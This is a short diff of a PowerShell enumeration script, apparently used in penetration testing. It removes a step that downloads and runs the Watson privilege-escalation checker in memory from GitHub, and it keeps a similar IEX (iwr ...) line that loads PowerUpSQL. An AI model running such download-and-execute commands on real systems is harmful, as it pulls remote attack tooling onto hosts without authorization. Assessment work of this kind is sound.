@@ -119,12 +119,6 @@ try {
     Write-Host "[OK] AppLocker Inspector -> applocker_inspector.txt" -ForegroundColor Green
 } catch { Write-Host "[--] AppLocker Inspector failed: $_" -ForegroundColor DarkGray }
 
-# Watson
-try {
-    & { IEX (iwr 'https://raw.githubusercontent.com/rasta-mouse/Watson/master/Watson.ps1') } *>&1 | Out-File "$OUT\watson.txt" -Encoding utf8
-    Write-Host "[OK] Watson -> watson.txt" -ForegroundColor Green
-} catch { Write-Host "[--] Watson failed: $_" -ForegroundColor DarkGray }
-
 # PowerUpSQL
 try {
     IEX (iwr 'https://raw.githubusercontent.com/NetSPI/PowerUpSQL/master/PowerUpSQL.ps1')
